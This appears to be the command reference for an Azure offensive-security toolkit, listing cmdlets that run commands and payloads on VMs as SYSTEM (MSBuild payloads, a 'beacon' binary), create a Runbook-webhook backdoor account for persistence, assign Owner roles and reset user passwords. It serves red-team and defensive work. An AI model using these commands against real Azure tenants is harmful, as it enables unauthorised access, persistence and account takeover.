Operational
===========

Execute-Command
---------------


.. _**Synopsis**-21:

**Synopsis**


Will run a command or script on a specified VM


.. _**Syntax**-21:

**Syntax**


::

  Execute-Command -OS [OS] -ResourceGroup [RG Name] -VM [VM Name] -Command [Command]

.. _**Description**-21:

**Description**


Executes a command on a virtual machine in Azure using 
::

  az vm run-command invoke

.. _**Examples**-21:

**Examples**


::

  Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami

.. _**Parameters**-21:

**Parameters** 


-OS

Operating system, options are 'Linux' or 'Windows'

-ResourceGroup

Resource group name the VM is located in

-VM

Name of the virtual machine to execute the command on

-Command

The command to be executed

.. _required-modules-20:

**Required Modules**


Azure CLI

.. _**Output**-21:

**Output**


Output of command being run or a failure message if failed

Execute-MSBuild
---------------

.. _**Synopsis**-22:

**Synopsis**


Will run a supplied MSBuild payload on a specified VM. By default, Azure
VMs have .NET 4.0 installed. Requires Contributor Role. Will run as
SYSTEM.






.. _**Syntax**-22:

**Syntax**



::

  Execute-MSBuild -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload/onyourmachine.xml]

.. _**Description**-22:

**Description**


Uploads an MSBuild payload as a .ps1 script to the target VM then calls
msbuild.exe with 

::

  az run-command invoke.

.. _**Examples**-22:

**Examples**



::

  Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbuild.xml

.. _**Parameters**-22:

**Parameters** 


-ResourceGroup


Resource group name the VM is located in


-VM


Name of the virtual machine to execute the command on


-File


Location of build.xml file

.. _required-modules-21:

**Required Modules**


Azure CLI

.. _**Output**-22:

**Output**


Success message of msbuild starting the build if successful, error
message if upload failed.

Execute-Program 
---------------

.. _**Synopsis**-23:

**Synopsis**


Will run a given binary on a specified VM






.. _**Syntax**-23:

**Syntax**



::

  Execute-Program -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload.exe]

.. _**Description**-23:

**Description**


Takes a supplied binary, base64 encodes the byte stream to a file,
uploads that file to the VM, then runs a command via
 
::

  az run-command invoke

to decode the base64 byte stream to a .exe file, then executes
the binary.

.. _**Examples**-23:

**Examples**



::
	Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbeacon.exe

.. _**Parameters**-23:

**Parameters** 


-ResourceGroup

Resource group name the VM is located in

-VM

Name of the virtual machine to execute the command on

-File

Location of executable binary

.. _required-modules-22:

**Required Modules**


Azure CLI

.. _**Output**-23:

**Output**


“Provisioning Succeeded” **Output**. Because it’s a binary being executed,
there will be no native **Output** unless the binary is meant to return data
to stdout.

Create-Backdoor
---------------

.. _**Synopsis**-24:

**Synopsis**


Creates a backdoor in Azure via Runbooks






.. _**Syntax**-24:

**Syntax**


::

  Create-Backdoor -Username [Username] -Password [Password] -AutomationAccount [AA name] -ResourceGroup [RG Name] -NewUsername [New UN] -NewPassword [New Password]

.. _**Description**-24:

**Description**


Will create a Runbook that creates an Azure account and generates a
Webhook to that Runbook so it can be executed if you lose access to
Azure. Also gives the ability to upload your own .ps1 file as a Runbook
(Customization)

This requires an account that is part of the 'Administrators' Role
(Needed to make a user)

.. _**Examples**-24:

**Examples**


::

  Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd


.. _**Parameters**-24:

**Parameters** 


-Username

Username you used to login to Azure with, that has  to create
a Runbook and user

-Password

Password to that account

-AutomationAccount

Azure Automation Account name

-ResourceGroup

Resource Group name

-NewUsername

Username you want to create

-NewPassword

Password for that new account

.. _required-modules-23:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-24:

**Output**


URI if successful,  error if failure

Execute-Backdoor 
----------------

.. _**Synopsis**-25:

**Synopsis**


This runs the backdoor URI that is created with "Create-Backdoor”






.. _**Syntax**-25:

**Syntax**



::

  Execute-Backdoor -URI [URI]

.. _**Description**-25:

**Description**


Executes the URI created by Create-Backdoor

.. _**Examples**-25:

**Examples**



::

  Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d

.. _**Parameters**-25:

**Parameters** 


-URI

The URI generated by Create-Backdoor

.. _required-modules-24:

**Required Modules**


| Azure CLI
| Azure PowerShell

.. _**Output**-25:

**Output**


Webhook successfully executed

Execute-CommandRunbook
----------------------

.. _**Synopsis**-26:

**Synopsis**


Will execute a supplied command or script from a Runbook if the Runbook
is configured with a "RunAs" account






.. _**Syntax**-26:

**Syntax**



::

  Execute-CommandRunbook -AutomationAccount [AA Name] -ResourceGroup [RGName] -VM [VM Name] -Command [Command]

.. _**Description**-26:

**Description**


If an Automation Account is utilizing a ‘Runas’ account, this allows you
to run commands against a virtual machine if that RunAs account has the
correct  over the VM.

.. _**Examples**-26:

**Examples**


::

  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami


::

  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Script "C:temptest.ps1"

.. _**Parameters**-26:

**Parameters** 


-AutomationAccount

Automation Account name

-ResourceGroup

Resource Group name

-VM

VM name

-Command (optional)

Command to be run against the VM. Choose this or -Script if executing an
entire script

-Script (optional)

Run an entire script instead of just one command.

.. _required-modules-25:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-26:

**Output**


**Output** of command if successfully ran.

Upload-StorageContent
---------------------

.. _**Synopsis**-27:

**Synopsis**


Uploads a supplied file to a storage share.






.. _**Syntax**-27:

**Syntax**



::

  Upload-StorageContent -StorageAccount [Storage Account name] -Share [Storage share name] -File [File name to upload]

.. _**Description**-27:

**Description**


Uploads a supplied file to a storage container located in a storage
account

.. _**Examples**-27:

**Examples**



::

  Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt

.. _**Parameters**-27:

**Parameters** 


-StorageAccount

Name of Storage account. Try Get-StorageAccounts for a list.

-File

File to upload

-Share

Share name to upload to

.. _required-modules-26:

**Required Modules**


Azure CLI

Azure Powershell

.. _**Output**-27:

**Output**


Success message

Stop-VM
-------

.. _**Synopsis**-28:

**Synopsis**


Stops a Virtual Machine






.. _**Syntax**-28:

**Syntax**



::

   Stop-VM -VM [VM name] -ResourceGroup [RG] 

.. _**Description**-28:

**Description**


Stops a VM

.. _**Examples**-28:

**Examples**



::

   Stop-VM -VM Example2016R2 -ResourceGroup Test_RG

.. _**Parameters**-28:

**Parameters** 


-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-27:

**Required Modules**


Azure CLI

.. _**Output**-28:

**Output**


VM successfully stops

Start-VM 
--------

**Synopsis**

Starts a Virtual Machine

****

**Syntax**


::

   Start-VM -VM [VM name] -ResourceGroup [RG] 

**Description**

Starts a VM

**Examples**


::

   Start-VM -VM Example2016R2 -ResourceGroup Test_RG

**Parameters**

-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-28:

**Required Modules**


Azure CLI

**Output**

VM successfully starts

.. _section-1:

Restart-VM 
----------

**Synopsis**

Restarts a Virtual Machine

****

**Syntax**


::

   Restart-VM -VM [VM name] -ResourceGroup [RG] 

**Description**

Restarts a VM

**Examples**


::

   Restart-VM -VM Example2016R2 -ResourceGroup Test_RG

**Parameters**

-VM

Name of machine

-ResourceGroup

Resource group the VM is located in

.. _required-modules-29:

**Required Modules**


Azure CLI

**Output**

VM successfully restarts

Start-Runbook
-------------

.. _**Synopsis**-29:

**Synopsis**


Starts a Runbook






.. _**Syntax**-29:

**Syntax**



::

   Start-Runbook -Account [Automation Account name] -ResourceGroup [Resource Group name] -Runbook [Runbook name] 

.. _**Description**-29:

**Description**


Starts a specified Runbook

.. _**Examples**-29:

**Examples**



::

   Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook 

.. _**Parameters**-29:

**Parameters** 


-Account

Name of Automation Account the Runbook is in

-ResourceGroup

Resource group it's located in

-Runbook

Name of runbook

.. _required-modules-30:

**Required Modules**


Azure CLI

Azure PowerShell

.. _**Output**-29:

**Output**


Runbook **Output**

Set-Role
--------

.. _**Synopsis**-30:

**Synopsis**


Assigns a user a role for a specific resource or subscription






.. _**Syntax**-30:

**Syntax**



::

  Set-Role -Role Owner -User [UPN] -Resource [Resource name]

.. _**Description**-30:

**Description**


Sets a role over a resource or subscription.

.. _**Examples**-30:

**Examples**



::

  Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM


::

  Set-Role -Role Owner -User john@contoso.com -Subscription SubName

.. _**Parameters**-30:

**Parameters** 


-User

Name of user in format user@domain.com

-Role

Role name (must be properly capitalized)

-Resource

Name of Resource

-Subscription

Name of subscription

.. _required-modules-31:

**Required Modules**


Azure CLI

.. _**Output**-30:

**Output**


Role successfully applied

Remove-Role 
-----------

**Synopsis**

Removes a user from a role for a specific resource or subscription

****

**Syntax**


::

  Remove-Role -Role Owner -User [UPN] -Resource [Resource name]

**Description**

Removes a role over a resource or subscription.

**Examples**


::

  Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM


::

  Remove-Role -Role Owner -User john@contoso.com -Subscription SubName

**Parameters**

-User

Name of user in format user@domain.com

-Role

Role name (must be properly capitalized)

-Resource

Name of Resource

-Subscription

Name of subscription

.. _required-modules-32:

**Required Modules**


Azure CLI

**Output**

Role successfully Removed

Set-Group
---------

.. _**Synopsis**-31:

**Synopsis**


Adds a user to an Azure AD Group






.. _**Syntax**-31:

**Syntax**



::

  Set-Group -User [UPN] -Group [Group name]

.. _**Description**-31:

**Description**


Adds a user to an AAD group. If the group name has spaces, put the group
name in single quotes.

.. _**Examples**-31:

**Examples**



::

  Set-Group -User john@contoso.com -Group 'SQL Users' 

.. _**Parameters**-31:

**Parameters** 


-User

UPN of the user

-Group

AAD Group name

.. _required-modules-33:

**Required Modules**


Azure CLI

.. _**Output**-31:

**Output**


User added to group

Set-Password
------------

.. _**Synopsis**-32:

**Synopsis**


Sets a user's password






.. _**Syntax**-32:

**Syntax**



::

  Set-Password -Username [UPN] -Password [new password]

.. _**Description**-32:

**Description**


Sets a user’s password. Requires AAD PS Module.

.. _**Examples**-32:

**Examples**



::

  Set-Password -Username john@contoso.com -Password newpassw0rd1

.. _**Parameters**-32:

**Parameters** 


-Password

New password for user

-Username

Name of user

.. _required-modules-34:

**Required Modules**


Azure CLI

AzureAD PowerShell

.. _**Output**-32:

**Output**


Password successfully set